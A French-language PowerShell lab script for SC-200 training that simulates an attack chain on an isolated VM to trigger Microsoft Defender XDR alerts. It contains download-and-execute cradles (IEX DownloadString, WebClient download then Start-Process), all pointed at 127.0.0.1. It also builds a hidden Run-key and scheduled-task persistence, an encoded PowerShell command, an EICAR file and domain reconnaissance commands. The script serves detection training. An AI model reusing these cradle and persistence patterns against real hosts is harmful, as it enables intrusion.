#Requires -Version 5.1
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    [LAB SC-200] Scenario A - Intrusion initiale
    Phishing -> Execution -> Evasion -> Persistance -> Decouverte
    Genere une chaine d'alertes correlees en UN SEUL incident dans Microsoft Defender XDR.

.DESCRIPTION
    Script de SIMULATION a usage EXCLUSIF de formation, sur une VM de lab isolee
    onboardee dans Microsoft Defender for Endpoint.

    Aucune action reellement dangereuse :
      - Les "telechargements" pointent vers 127.0.0.1 (echec immediat, sans reseau).
      - Le "malware" est le fichier de test standard EICAR (totalement inoffensif),
        reconstruit a l'execution pour que le .ps1 lui-meme ne soit pas mis en quarantaine.
      - La persistance (cle Run + tache planifiee) est reversible via -Cleanup.

    NE JAMAIS executer sur un poste de production ou un environnement non autorise.

.PARAMETER Force
    Lance le scenario sans confirmation interactive (utile en re-execution entre cohortes).

.PARAMETER Cleanup
    Supprime uniquement les artefacts laisses par le scenario, puis quitte.

.NOTES
    MITRE ATT&CK : T1566 / T1059.001 / T1204 / T1027 / T1547.001 / T1053.005 /
                   T1087 / T1082 / T1016 / T1057 / T1018
#>
[CmdletBinding()]
param(
    [switch]$Force,
    [switch]$Cleanup
)

# --------------------------------------------------------------------------
# Constantes du scenario
# --------------------------------------------------------------------------
$ScenarioName = "Scenario A - Intrusion initiale"
$WorkDir      = "C:\LabSC200\ScenarioA"
$RunKeyPath   = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RunKeyName   = "MicrosoftEdgeUpdaterX"
$TaskName     = "MicrosoftEdgeUpdateTaskX"
$LogFile      = Join-Path $env:TEMP "LabSC200-ScenarioA.log"

function Write-Stage {
    param([string]$Step, [string]$Message)
    $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "[$ts] [$Step] $Message"
    Write-Host $line -ForegroundColor Cyan
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
}

function Invoke-Cleanup {
    Write-Host "`n--- Nettoyage des artefacts du Scenario A ---" -ForegroundColor Yellow
    Remove-ItemProperty -Path $RunKeyPath -Name $RunKeyName -ErrorAction SilentlyContinue
    schtasks /delete /tn $TaskName /f 2>$null | Out-Null
    Remove-Item -Path $WorkDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Nettoyage termine (cle Run, tache planifiee et dossier de travail supprimes)." -ForegroundColor Green
}

# --------------------------------------------------------------------------
# Mode nettoyage seul
# --------------------------------------------------------------------------
if ($Cleanup) { Invoke-Cleanup; return }

# --------------------------------------------------------------------------
# Garde-fou : confirmation
# --------------------------------------------------------------------------
Write-Host "==========================================================" -ForegroundColor Red
Write-Host " LAB SC-200 - $ScenarioName" -ForegroundColor Red
Write-Host " SIMULATION D'ATTAQUE - VM DE FORMATION ISOLEE UNIQUEMENT" -ForegroundColor Red
Write-Host "==========================================================" -ForegroundColor Red
if (-not $Force) {
    $ans = Read-Host "Confirmez l'execution sur une VM de lab autorisee en tapant OUI"
    if ($ans -ne "OUI") { Write-Host "Annule." -ForegroundColor Yellow; return }
}

New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
Write-Stage "INIT" "Demarrage du scenario. Journal : $LogFile"

# --------------------------------------------------------------------------
# Etape 1 - EXECUTION : cradle PowerShell de telechargement (test EDR documente)
# Cible 127.0.0.1 => echec immediat, mais la ligne de commande est l'IOC detecte.
# --------------------------------------------------------------------------
Write-Stage "T1059.001" "Cradle PowerShell de telechargement (Initial Access / Execution)"
try {
    $cradle = '$ErrorActionPreference=''SilentlyContinue'';' +
              '(New-Object System.Net.WebClient).DownloadFile(' +
              '''http://127.0.0.1/invoice.exe'',''' + $WorkDir + '\invoice.exe'');' +
              'Start-Process ''' + $WorkDir + '\invoice.exe'''
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cradle" `
        -Wait -ErrorAction SilentlyContinue
} catch { Write-Stage "T1059.001" "Cradle execute (echec reseau attendu)." }

# --------------------------------------------------------------------------
# Etape 2 - MALWARE : depot du fichier de test EICAR (inoffensif)
# Reconstruit a l'execution pour ne pas declencher sur le .ps1 lui-meme.
# La detection / mise en quarantaine EST le resultat attendu.
# --------------------------------------------------------------------------
Write-Stage "T1204" "Depot du fichier de test EICAR (detection AV attendue)"
try {
    $p1 = 'X5O!P%@AP[4\P' + 'ZX54(P^)7CC)7}'
    $p2 = '$EICAR-STANDARD-ANTIVIRUS-' + 'TEST-FILE!$H+H*'
    Set-Content -Path (Join-Path $WorkDir "facture_impayee.pdf.exe") -Value ($p1 + $p2) -Encoding Ascii -ErrorAction SilentlyContinue
} catch { Write-Stage "T1204" "Ecriture bloquee par l'AV = comportement attendu." }

# --------------------------------------------------------------------------
# Etape 3 - EVASION : commande PowerShell encodee en Base64
# --------------------------------------------------------------------------
Write-Stage "T1027" "Execution d'une commande PowerShell encodee (Defense Evasion)"
try {
    $inner = "Write-Host 'lab-evasion'; whoami; Get-Process | Out-Null"
    $enc   = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($inner))
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $enc" -Wait -ErrorAction SilentlyContinue
} catch {}

# --------------------------------------------------------------------------
# Etape 4 - PERSISTANCE : cle Run + tache planifiee
# --------------------------------------------------------------------------
Write-Stage "T1547.001" "Persistance par cle de Registre Run (HKCU)"
New-ItemProperty -Path $RunKeyPath -Name $RunKeyName `
    -Value "powershell.exe -w hidden -nop -c IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/a.ps1')" `
    -PropertyType String -Force -ErrorAction SilentlyContinue | Out-Null

Write-Stage "T1053.005" "Persistance par tache planifiee"
schtasks /create /tn $TaskName `
    /tr "powershell.exe -w hidden -nop -c whoami" `
    /sc DAILY /st 09:00 /f 2>$null | Out-Null

# --------------------------------------------------------------------------
# Etape 5 - DECOUVERTE : sequence de reconnaissance (declenche
# "Suspicious sequence of exploration activities")
# --------------------------------------------------------------------------
Write-Stage "T1087/T1082/T1016/T1057/T1018" "Sequence de reconnaissance"
cmd.exe /c "whoami /all"                              2>$null | Out-Null
cmd.exe /c "net user"                                 2>$null | Out-Null
cmd.exe /c "net localgroup administrators"            2>$null | Out-Null
cmd.exe /c "net group ""Domain Admins"" /domain"      2>$null | Out-Null
cmd.exe /c "systeminfo"                               2>$null | Out-Null
cmd.exe /c "ipconfig /all"                            2>$null | Out-Null
cmd.exe /c "nltest /domain_trusts /all_trusts"        2>$null | Out-Null
cmd.exe /c "net view /all"                            2>$null | Out-Null

# --------------------------------------------------------------------------
Write-Host "`n==========================================================" -ForegroundColor Green
Write-Host " Scenario A termine. Les alertes apparaissent dans Defender XDR" -ForegroundColor Green
Write-Host " sous ~10-30 min, correlees en UN incident sur cet appareil." -ForegroundColor Green
Write-Host " Artefacts de persistance laisses pour investigation." -ForegroundColor Green
Write-Host " Pour nettoyer : .\Invoke-LabScenarioA-IntrusionInitiale.ps1 -Cleanup" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Green
Write-Stage "DONE" "Scenario A complete."
